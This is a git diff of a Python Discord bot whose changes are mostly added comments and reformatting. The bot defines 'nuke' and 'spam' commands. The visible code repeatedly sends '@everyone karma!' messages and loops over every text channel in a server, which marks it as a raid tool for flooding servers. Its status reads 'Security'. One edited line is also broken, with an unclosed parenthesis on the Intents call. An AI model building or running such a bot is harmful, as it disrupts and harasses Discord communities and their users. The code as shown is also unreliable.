@@ -1,31 +1,32 @@
+# dont remove thoses unless you know what youre doing
 import discord
 from discord.ext import commands, tasks
 import os
 import asyncio
+
+# local variables
 Bot_token = "" # add your bot's token betwen the ""
-prefix='!'
-n=0
+prefix = '!'
+n = 0
 
-intents=discord.Intents.default()
-intents = discord.Intents(messages=True, guilds=True)
-
-
-
-
+# === preparing the bot ===
+intents = discord.Intents.default()
+intents = discord.Intents(messages=True, guilds=True
 client = commands.Bot(command_prefix=prefix, intents=intents)
+
+
+# prints whenever the bot is ready 
 @client.event
 async def on_ready():
     print('Bot is online')
     await client.change_presence(activity=discord.Game('Security'))
 
+
+# ping command
 @client.command()
 async def ping(ctx):
     await ctx.send(f'Pong! {round(client.latency * 1000)}ms')
-
-@client.command
-async def invite(ctx):
-  await ctx.reply('')
-
+# nuke command 
 @client.command()
 async def nuke(ctx):
 
@@ -47,7 +48,7 @@ async def nuke(ctx):
              await c.send('@everyone karma!')
              await c.send('@everyone karma!')
              await c.send('@everyone karma!')
-
+# spam command
 @client.command()
 async def spam(ctx):
     for c in ctx.guild.text_channels:
